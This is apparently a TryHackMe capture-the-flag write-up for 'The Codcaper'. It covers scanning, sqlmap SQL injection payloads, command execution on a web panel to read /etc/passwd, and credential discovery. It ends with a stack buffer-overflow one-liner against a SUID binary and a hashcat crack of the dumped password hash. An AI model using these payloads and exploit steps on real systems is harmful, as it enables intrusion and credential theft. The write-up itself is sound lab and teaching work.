---
title: "The Codcaper"
date: 2022-09-20T16:00:31+01:00
draft: false
categories:
  - TryHackMe
---

<img src="pingu.jpeg" width=200 height=200 alt="pingu">

## Enumeration

### nmap

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ffuf

```
 :: Method           : GET
 :: URL              : http://10.10.5.111/FUZZ.php
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 ________________________________________________

 .hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
 .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
 .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
 [Status: 403, Size: 276, Words: 20, Lines: 10]
 administrator           [Status: 200, Size: 409, Words: 53, Lines: 22]
```

its guided room...so speedrun

obvious sql injection

```
sqlmap -u http://10.10.5.111/administrator.php --forms --dump

Parameter: username (POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: username=iewm' RLIKE (SELECT (CASE WHEN (6931=6931) THEN 0x6965776d ELSE 0x28 END))-- pxHY&password=

Type: error-based
Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
Payload: username=iewm' AND GTID_SUBSET(CONCAT(0x7178787a71,(SELECT (ELT(1090=1090,1))),0x7171767871),1090)-- qgeV&password=

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: username=iewm' AND (SELECT 7299 FROM (SELECT(SLEEP(5)))IoDT)-- SNGS&password=

---

Database: users
Table: users
[1 entry]
+------------+----------+
| password | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+
```

After login the rce input says "command"...bruh we know its RCE but damn that was direct

```
ls

2591c98b70119fe624898b1e424b5e91.php administrator.php index.html index.html
```

```
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false \_apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false papa:x:1000:1000:qaa:/home/papa:/bin/bash mysql:x:108:116:MySQL Server,,,:/nonexistent:/bin/false sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin pingu:x:1002:1002::/home/pingu:/bin/bash pingu:x:1002:1002::/home/pingu:/bin/bash
```

pingu and papa are users

At this point we could just use a shell to get inside but I want to do it the other way

`find / -type f -user pingu`

```
/home/pingu/.cache/motd.legal-displayed /home/pingu/.ssh/id_rsa /home/pingu/.ssh/id_rsa.pub /home/pingu/.gdb_history /home/pingu/.pwntools-cache-2.7/update /home/pingu/.pwntools-cache-2.7/update
```

`find / -type f -user papa`

```
/home/papa/.bash_history /home/papa/.bash_logout /home/papa/.profile /home/papa/.bashrc /home/papa/.sudo_as_admin_successful /home/papa/.pwntools-cache-2.7/update /var/backups/shadow.bak /var/backups/shadow.bak
```

Ah..I may be doing this wrong

Assuming we have access to the file let's try this

`find / -user www-data`

Among a thousand files...the last ones are interresting

```
...
/var/hidden/pass /var/hidden/pass
```

`cat /var/hidden/pass`

```
pinguapingu pinguapingu
```

so..ssh creds are

`pingu : pinguapingu`

I am not a big fan of privesc scripts but hey..let's load that noisy linenum

`scp LinEnum.sh pingu@10.10.8.121:/tmp`

```
....

[-] SUID files:
-r-sr-xr-x 1 root papa 7516 Jan 16 2020 /opt/secret/root
-rwsr-xr-x 1 root root 136808 Jul 4 2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 10624 May 8 2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40432 May 16 2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16 2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 May 16 2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 16 2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 49584 May 16 2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 428240 Mar 4 2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16 2017 /bin/su
-rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6
-rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16 2018 /bin/mount
-rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount
-rwsr-xr-x 1 root root 27608 May 16 2018 /bin/umount

....
```

yeah definitelly `/opt/secret/root`

Oh cool the binary exploitation part

`gdb /opt/secret/root` (I need pwndbg too)

we run cyclic input to pass 50 characters when the program expects 32

```
r < <(cyclic 50)

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
EAX 0x1
EBX 0x0
ECX 0x1
EDX 0xf779b87c (_IO_stdfile_0_lock) ◂— 0
EDI 0xf779a000 (\_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /_ 0x1b1db0 _/
ESI 0xf779a000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /_ 0x1b1db0 _/
EBP 0x6161616b ('kaaa')
ESP 0xffdfeb10 ◂— 0xf700616d /_ 'ma' _/
EIP 0x6161616c ('laaa')
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Invalid address 0x6161616c

00:0000│ esp 0xffdfeb10 ◂— 0xf700616d /_ 'ma' _/
01:0004│ 0xffdfeb14 —▸ 0xffdfeb30 ◂— 0x1
02:0008│ 0xffdfeb18 ◂— 0x0
03:000c│ 0xffdfeb1c —▸ 0xf7600637 (**libc*start_main+247) ◂— add esp, 0x10
04:0010│ 0xffdfeb20 —▸ 0xf779a000 (\_GLOBAL_OFFSET_TABLE*) ◂— mov al, 0x1d /_ 0x1b1db0 _/
... ↓
06:0018│ 0xffdfeb28 ◂— 0x0
07:001c│ 0xffdfeb2c —▸ 0xf7600637 (**libc_start_main+247) ◂— add esp, 0x10
───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
► f 0 6161616c
f 1 f700616d
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x6161616c)
```

heh...segfault at 0x6161616c...trying to overwrite EIP

`pwndbg> cyclic -l 0x6161616c`

```
44
```

we need 44 chars to overwrte EIP

I chose the manual way over pwntools but both are handy

```
pwndbg> disassemble shell
Dump of assembler code for function shell:
0x080484cb <+0>: push ebp
0x080484cc <+1>: mov ebp,esp
0x080484ce <+3>: sub esp,0x8
0x080484d1 <+6>: sub esp,0xc
0x080484d4 <+9>: push 0x3e8
0x080484d9 <+14>: call 0x80483a0 <setuid@plt>
0x080484de <+19>: add esp,0x10
0x080484e1 <+22>: sub esp,0xc
0x080484e4 <+25>: push 0x3e8
0x080484e9 <+30>: call 0x8048370 <setgid@plt>
0x080484ee <+35>: add esp,0x10
0x080484f1 <+38>: sub esp,0xc
0x080484f4 <+41>: push 0x80485d0
0x080484f9 <+46>: call 0x8048380 <system@plt>
0x080484fe <+51>: add esp,0x10
0x08048501 <+54>: nop
0x08048502 <+55>: leave
0x08048503 <+56>: ret
End of assembler dump.
```

we import struct to convert the addredd to little endian (can be done manually then inserted)

`python -c 'import struct;print "A"\*44 + struct.pack("<I",0x080484cb)'`

And pipe it to the program...to reveal the hashed password

`python -c 'import struct;print "A"\*44 + struct.pack("<I",0x080484cb)' | /opt/secret/root`

I need to learn assembly ASAP

```
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
```

Might be SHA-512...so hashcat mode..1800?

```
hashcat -m 1800 '$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.' /usr/share/wordlists/rockyou.txt
```

cracked! password is `love2fish`

noot noot
